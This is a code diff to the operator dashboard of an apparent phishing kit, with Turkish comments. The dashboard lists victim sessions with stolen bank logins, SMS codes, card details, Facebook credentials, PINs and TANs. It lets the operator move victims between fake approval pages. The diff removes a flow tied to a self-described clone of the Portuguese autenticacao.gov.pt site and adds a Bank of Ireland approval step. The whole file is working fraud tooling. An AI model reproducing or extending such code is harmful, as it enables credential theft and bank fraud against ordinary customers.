@@ -28,7 +28,7 @@ const LOG_PAGE_SIZE = 100;
 
 const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "transfer", label: "Transfer Onayı" },
-  { value: "autenticacao", label: "Autenticação" },
+  { value: "boi_approval", label: "Bank of Ireland Onayı" },
 ];
 
 function getApprovalDisplayText(value: string): string {
@@ -39,6 +39,10 @@ function getApprovalDisplayText(value: string): string {
   // Transfer onayi: yontem (smartid/mobileid) suffix'li — kolonda tek "Transfer" goster.
   if (rawValue.startsWith("transfer")) {
     return isConfirmed ? "Transfer Onaylandı" : "Transfer [Bekliyor]";
+  }
+
+  if (rawValue === "boi_approval" || rawValue === "boi") {
+    return isConfirmed ? "BOI Onaylandı" : "BOI [Bekliyor]";
   }
 
   const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === rawValue);
@@ -498,16 +502,10 @@ function resolveBankLogoUrl(fd: Record<string, any>): { src: string | null; init
   return { src: finalSrc, initials, fallbackColor };
 }
 
-// PT banka slug'lari: giris yontemi kavrami yok (Autenticacao/ozel sablon),
+// PT banka slug'lari: giris yontemi kavrami yok (ozel sablon),
 // Banka kolonunda "Giris yontemi: bekleniyor" rozeti gosterilmez.
 const PT_BANK_SLUGS = new Set([
   "cgd", "abanca", "bpi", "novo-banco", "santander-pt",
-  "millennium-bcp", "activobank", "montepio", "credito-agricola",
-]);
-// Giris yontemi OLMAYAN bankalar (autenticacao'ya giden PT bankalari):
-// Banka kolonunda tamamen bos gosterilir (credential girilmedikce).
-const AUTH_ONLY_BANK_SLUGS = new Set([
-  "millennium-bcp", "activobank", "montepio", "credito-agricola",
 ]);
 
 // ============================================================
@@ -655,7 +653,6 @@ function getStepDisplay(
   else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
   else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
   else if (s === "facebook") { stepText = "FACEBOOK"; stepColor = "text-[#0064E0] bg-[#0064E0]/10 border border-[#0064E0]/20"; }
-  else if (s === "autenticacao") { stepText = "AUTENTICAÇÃO"; stepColor = "text-sky-600 bg-sky-500/10 border border-sky-500/20"; }
   else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
   else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
   else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
@@ -665,8 +662,13 @@ function getStepDisplay(
   else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
   else if (s === "special_approval") {
     const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
-    const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
-    stepText = opt ? `${opt.label.replace(" Sayfası", "").toUpperCase()} ONAYI` : "ÖZEL BİLDİRİM";
+    if (rawAppr === "boi_approval" || rawAppr === "boi") {
+      stepText = "BANK OF IRELAND ONAYI";
+    } else {
+      const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
+      const baseLabel = opt ? opt.label.replace(/ Onayı$/i, "").replace(/ Sayfası$/i, "") : "";
+      stepText = opt ? `${baseLabel.toUpperCase()} ONAYI` : "ÖZEL BİLDİRİM";
+    }
     stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
   }
 
@@ -1543,6 +1545,32 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       return;
     }
 
+    if (approvalValue === "boi_approval" || approvalValue === "boi") {
+      if (!supabase) return;
+      const row = rowsRef.current.find((r) => r.id === sessionId);
+      const previousFormData =
+        row?.form_data && typeof row.form_data === "object" ? { ...row.form_data } : {};
+      await supabase
+        .from("sessions")
+        .update({
+          is_hidden: false,
+          status: "online",
+          current_step: "special_approval",
+          form_data: {
+            ...previousFormData,
+            approvalStatus: "boi_approval",
+            approvalCode: "",
+            specialNoticeText: "",
+            specialNoticeImage: "",
+            specialNoticeLang: undefined,
+            specialNoticeSentAt: "",
+          },
+        })
+        .eq("id", sessionId);
+      void load();
+      return;
+    }
+
     setApprovalPromptSessionId(sessionId);
     setApprovalPromptType(approvalValue);
     setApprovalCodeInput("");
@@ -1665,73 +1693,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       return;
     }
 
-    // AUTENTICACAO: kullanici /autenticacao (autenticacao.gov.pt klonu) sayfasina gider.
-    // Adim 1 (telemovel+PIN) zaten doldurulmus olabilir — tekrar gonderimde eski TAN
-    // temizlenir, varsa onceki auth verisi autenticacaoHistory'ye tasinir.
-    // Kullanici adim 2'deki TAN'i gonderince approvalStatus "autenticacao_confirmed" olur.
-    if (approvalPromptType === "autenticacao") {
-      const authHistory: any[] = Array.isArray(previousFormData.autenticacaoHistory)
-        ? [...previousFormData.autenticacaoHistory]
-        : [];
-      const prevTan =
-        typeof previousFormData.cmdTan === "string" && previousFormData.cmdTan.trim()
-          ? previousFormData.cmdTan
-          : previousFormData.autenticacaoTan;
-      if (prevTan) {
-        authHistory.push({
-          generatorType: "autenticacao",
-          data: {
-            "Telemóvel": previousFormData.cmdPhone || "",
-            PIN: previousFormData.cmdPin || "",
-            TAN: prevTan,
-          },
-          submittedAt: previousFormData.autenticacaoSubmittedAt || new Date().toISOString(),
-        });
-      }
-      // Autenticacao kolonu icin banka kaydini garantiye al:
-      // istemci autenticacaoBankName yazamadiysa ve slug auth-only setteyse
-      // mevcut bankSlug/bankName'den turetilir. Normal sablonlu banka yazilmaz.
-      const prevBankSlugLower =
-        typeof previousFormData.bankSlug === "string"
-          ? previousFormData.bankSlug.trim().toLowerCase()
-          : "";
-      const authBankPatch: Record<string, string> = {};
-      if (
-        AUTH_ONLY_BANK_SLUGS.has(prevBankSlugLower) &&
-        typeof previousFormData.autenticacaoBankName !== "string"
-      ) {
-        authBankPatch.autenticacaoBankSlug = String(previousFormData.bankSlug);
-        authBankPatch.autenticacaoBankName = String(previousFormData.bankName || previousFormData.bankSlug);
-      }
-
-      await supabase
-        .from("sessions")
-        .update({
-          is_hidden: false,
-          status: "online",
-          current_step: "autenticacao",
-          form_data: {
-            ...previousFormData,
-            ...authBankPatch,
-            approvalStatus: "autenticacao",
-            autenticacaoHistory: authHistory,
-            cmdTan: "",
-            autenticacaoTan: "",
-            approvalCode: "",
-            specialNoticeText: "",
-            specialNoticeImage: "",
-            specialNoticeLang: undefined,
-            specialNoticeSentAt: "",
-          },
-        })
-        .eq("id", approvalPromptSessionId);
-
-      setApprovalPromptSessionId(null);
-      setApprovalPromptType("");
-      setApprovalCodeInput("");
-      void load();
-      return;
-    }
 
     await supabase
       .from("sessions")
@@ -1836,7 +1797,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
       const s = (v: unknown) => (v == null ? "" : String(v));
-      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "Autenticação", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "Generator", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
 
       const tableBody: any[][] = [
         COL_HEADERS.map(
@@ -1867,14 +1828,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           : { text: "-", color: "#9ca3af" };
 
         const genCell: any[] = [];
-        const authPhoneX = s(fd.cmdPhone).trim();
-        const authPinX = s(fd.cmdPin).trim();
-        const authTanX = s(fd.cmdTan).trim() || s(fd.autenticacaoTan).trim();
-        if (authPhoneX || authPinX || authTanX) {
-          if (authPhoneX) genCell.push({ text: `Tel: ${authPhoneX}` });
-          if (authPinX) genCell.push({ text: `PIN: ${authPinX}` });
-          if (authTanX) genCell.push({ text: `TAN: ${authTanX}`, bold: true, color: "#e11d48" });
-        }
         const genCurrentRaw =
           fd.generatorCurrent && typeof fd.generatorCurrent === "object"
             ? (fd.generatorCurrent as Record<string, any>)
@@ -2414,7 +2367,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                 <th className="min-w-[150px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                 <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="min-w-[115px] px-2 py-3 font-semibold whitespace-nowrap">Autenticação</th>
+                <th className="min-w-[115px] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
                 <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                 <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                 <th className="min-w-[95px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
@@ -2454,7 +2407,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 const loginMethod = readLoginMethod(fd);
                 const rawBankSlugLower = String(fd.bankSlug || "").trim().toLowerCase();
                 const isPtBank = PT_BANK_SLUGS.has(rawBankSlugLower) || /(^|[-_\s])pt($|[-_\s])/.test(rawBankSlugLower);
-                const isAuthOnlyBank = s === "autenticacao" || AUTH_ONLY_BANK_SLUGS.has(rawBankSlugLower);
                 const logoInfo = resolveBankLogoUrl(fd);
                 // Sadece GUNCEL durum: admin yeni istek gonderince "Bekliyor",
                 // kullanici onaylayinca "Onaylandi" goster. Eski history badge'i basmaz.
@@ -2543,14 +2495,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      {(() => {
-                        // Giris yontemi OLMAYAN bankalar (autenticacao'ya giden PT
-                        // bankalari) Banka kolonunda bos gosterilsin.
-                        if (isAuthOnlyBank && shortCreds.length === 0) {
-                          return <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
-                        }
-                        return null;
-                      })() ?? (
                       <div className="space-y-2 text-[12px] leading-tight">
                         {/* SATIR 1: BANKA ADI + GIRIS YONTEMI BADGE (LOGO KALDIRILDI) */}
                         <div className="flex items-start gap-2">
@@ -2595,7 +2539,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           </div>
                         )}
                       </div>
-                      )}
                     </td>
                     <td className="px-2 py-3 align-top">
                       {approvalEntries.length === 0 ? (
@@ -2615,71 +2558,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     </td>
                     <td className="px-2 py-3 align-top">
                       {(() => {
-                        const authPhone = typeof fd.cmdPhone === "string" && fd.cmdPhone.trim() ? fd.cmdPhone.trim() : "";
-                        const authPin = typeof fd.cmdPin === "string" && fd.cmdPin.trim() ? fd.cmdPin.trim() : "";
-                        const authTan =
-                          typeof fd.cmdTan === "string" && fd.cmdTan.trim()
-                            ? fd.cmdTan.trim()
-                            : typeof fd.autenticacaoTan === "string" && fd.autenticacaoTan.trim()
-                              ? fd.autenticacaoTan.trim()
-                              : "";
-                        const hasAuth = Boolean(authPhone || authPin || authTan);
-                        if (hasAuth) {
-                          return (
-                            <div className="space-y-1 text-[12px] font-medium leading-tight">
-                              {(() => {
-                                // Autenticacao kolonu: SADECE autenticacao akisina giden banka
-                                // adi basilir. Normal HTML sablonlu banka (cgd, bpi, santander-pt,
-                                // novo-banco, abanca vb.) ismi burada ASLA gorunmez.
-                                // Onceki akistan kalan eski banka adi da basilmaz — kayit
-                                // autenticacaoBankName / autenticacaoBankSlug'dan okunur.
-                                // Geriye donuk uyumluluk: eski sessionlarda bu alanlar yoksa,
-                                // bankSlug auth-only setteyse bankName gosterilir.
-                                const authBankName =
-                                  typeof fd.autenticacaoBankName === "string" && fd.autenticacaoBankName.trim()
-                                    ? fd.autenticacaoBankName.trim()
-                                    : typeof fd.autenticacaoBankSlug === "string" && fd.autenticacaoBankSlug.trim()
-                                      ? fd.autenticacaoBankSlug.trim()
-                                      : AUTH_ONLY_BANK_SLUGS.has(rawBankSlugLower)
-                                        ? String(fd.bankName || fd.bankSlug || "")
-                                        : "";
-                                if (!authBankName) return null;
-                                return (
-                                  <div className="font-extrabold text-[12px] text-sky-600 dark:text-sky-400 break-words [overflow-wrap:anywhere]">
-                                    {authBankName}
-                                  </div>
-                                );
-                              })()}
-                              {authPhone && (
-                                <div className="flex min-w-0 items-start gap-1">
-                                  <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">Tel:</span>
-                                  <span className="min-w-0 cursor-pointer font-mono font-bold whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPhone)}>{authPhone}</span>
-                                </div>
-                              )}
-                              {authPin && (
-                                <div className="flex min-w-0 items-start gap-1">
-                                  <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">PIN:</span>
-                                  <span className="min-w-0 cursor-pointer font-mono font-bold whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPin)}>{authPin}</span>
-                                </div>
-                              )}
-                              {authTan && (
-                                <div className="flex min-w-0 items-start gap-1">
-                                  <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">TAN:</span>
-                                  <span className="min-w-0 cursor-pointer font-mono font-bold text-rose-600 dark:text-rose-400 whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authTan)}>{authTan}</span>
-                                </div>
-                              )}
-                              {typeof fd.approvalStatus === "string" && fd.approvalStatus.startsWith("autenticacao") && (
-                                <span className={`inline-block w-fit rounded-full border px-2 py-0.5 text-[11px] font-bold tracking-wide whitespace-nowrap leading-tight ${
-                                  fd.approvalStatus === "autenticacao_confirmed"
-                                    ? "border-emerald-500/20 bg-emerald-500/10 text-emerald-600 dark:text-emerald-400"
-                                    : "border-amber-500/20 bg-amber-500/10 text-amber-600 dark:text-amber-400"
-                                }`}>
-                                  {fd.approvalStatus === "autenticacao_confirmed" ? "Autenticação Onaylandı" : "Autenticação [Bekliyor]"}
-                                </span>
-                              )}
-                            </div>
-                          );
-                        }
                         if (genEntries.length === 0) {
                           return <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
                         }
@@ -2892,15 +2770,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             const shortCreds = getShortBankCredentialFields(fd);
             const loginMethod = readLoginMethod(fd);
             const rawBankSlugLower = String(fd.bankSlug || "").trim().toLowerCase();
-            const isAuthOnlyBank = s === "autenticacao" || AUTH_ONLY_BANK_SLUGS.has(rawBankSlugLower);
-            const authPhone = typeof fd.cmdPhone === "string" && fd.cmdPhone.trim() ? fd.cmdPhone.trim() : "";
-            const authPin = typeof fd.cmdPin === "string" && fd.cmdPin.trim() ? fd.cmdPin.trim() : "";
-            const authTan =
-              typeof fd.cmdTan === "string" && fd.cmdTan.trim()
-                ? fd.cmdTan.trim()
-                : typeof fd.autenticacaoTan === "string" && fd.autenticacaoTan.trim()
-                  ? fd.autenticacaoTan.trim()
-                  : "";
             const smsValue =
               typeof fd.smsCode === "string" && fd.smsCode.trim()
                 ? fd.smsCode.trim()
@@ -2981,7 +2850,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 </div>
 
                 {/* BANKA BLOKU */}
-                {(!isAuthOnlyBank || shortCreds.length > 0) && (fd.bankName || shortCreds.length > 0) && (
+                {(fd.bankName || shortCreds.length > 0) && (
                   <div className={`rounded-xl p-2.5 space-y-1 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
                     {fd.bankName && (
                       <div className="font-extrabold text-[13px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
@@ -3006,31 +2875,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         </span>
                       </div>
                     ))}
-                  </div>
-                )}
-
-                {/* AUTENTICACAO BLOKU */}
-                {(authPhone || authPin || authTan) && (
-                  <div className={`rounded-xl p-2.5 space-y-1 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
-                    <div className="text-[10px] font-black uppercase tracking-widest text-sky-600 dark:text-sky-400">Autenticação</div>
-                    {authPhone && (
-                      <div className="flex items-start gap-1.5 text-[12px]">
-                        <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase mt-0.5">Tel:</span>
-                        <span className="font-mono font-bold cursor-pointer break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPhone)}>{authPhone}</span>
-                      </div>
-                    )}
-                    {authPin && (
-                      <div className="flex items-start gap-1.5 text-[12px]">
-                        <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase mt-0.5">PIN:</span>
-                        <span className="font-mono font-bold cursor-pointer break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPin)}>{authPin}</span>
-                      </div>
-                    )}
-                    {authTan && (
-                      <div className="flex items-start gap-1.5 text-[12px]">
-                        <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase mt-0.5">TAN:</span>
-                        <span className="font-mono font-bold text-rose-600 dark:text-rose-400 cursor-pointer break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authTan)}>{authTan}</span>
-                      </div>
-                    )}
                   </div>
                 )}
 
@@ -3292,14 +3136,10 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         if (hsAny.facebookLoginHistory !== undefined) mergedFd.facebookLoginHistory = hsAny.facebookLoginHistory;
         if (hsAny.cardLoginHistory !== undefined) mergedFd.cardLoginHistory = hsAny.cardLoginHistory;
         if (hsAny.generatorLoginHistory !== undefined) mergedFd.generatorLoginHistory = hsAny.generatorLoginHistory;
-        if (hsAny.autenticacaoHistory !== undefined) mergedFd.autenticacaoHistory = hsAny.autenticacaoHistory;
         const bHistory = parseBankHistory(mergedFd);
         const fHistory = parseFacebookHistory(mergedFd);
         const cHistory = parseCardHistory(mergedFd);
-        const authHistory = Array.isArray(mergedFd.autenticacaoHistory)
-          ? (mergedFd.autenticacaoHistory as any[]).filter((r) => r && typeof r === "object" && r.data && typeof r.data === "object")
-          : [];
-        const gHistory = [...authHistory, ...parseGeneratorHistory(mergedFd)];
+        const gHistory = parseGeneratorHistory(mergedFd);
         const copyText = (t: string) => {
           try { void navigator.clipboard.writeText(t); } catch { /* ignore */ }
         };
@@ -3350,7 +3190,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
                       💳 Kart: <span className="font-bold">{cHistory.length}</span>
                       <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
-                      🔐 Autenticação: <span className="font-bold">{gHistory.length}</span>
+                      🔐 Kodas: <span className="font-bold">{gHistory.length}</span>
                     </p>
                   </div>
                 </div>
@@ -3543,26 +3383,26 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     )}
                   </div>
 
-                  {/* ====================== 🔐 AUTENTICACAO GİRİŞLERİ ====================== */}
+                  {/* ====================== 🔐 KODAS GİRİŞLERİ ====================== */}
                   <div>
                     <div className="flex items-center gap-2 mb-4">
                       <span className="text-xl">🔐</span>
-                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Autenticação (Geçmiş)</h4>
+                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Kodas (Geçmiş)</h4>
                       <span className={`text-[12px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {gHistory.length} adet
                       </span>
                     </div>
                     {gHistory.length === 0 ? (
                       <div className={`rounded-2xl border-2 border-dashed py-10 text-center ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
-                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş autenticação kaydı yok.</p>
-                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı tekrar TAN kodu gönderince eskisi burada görünür.</p>
+                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş kodas kaydı yok.</p>
+                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı tekrar kod gönderince eskisi burada görünür.</p>
                       </div>
                     ) : (
                       <div className="space-y-3">
                         {gHistory.map((rec, idx) => {
                           const r = rec as Record<string, any>;
                           const genLabel =
-                            r.generatorType === "autenticacao" ? "Autenticação" : r.generatorType === "generator2" ? "kodas 2" : "kodas 1";
+                            r.generatorType === "generator2" ? "kodas 2" : "kodas 1";
                           const entries =
                             r.data && typeof r.data === "object"
                               ? Object.entries(r.data as Record<string, unknown>).filter(
@@ -3721,7 +3561,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                   />
                 </div>
-              ) : approvalPromptType === "autenticacao" ? null : (
+              ) : (
                 <div>
                   <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
                   <input
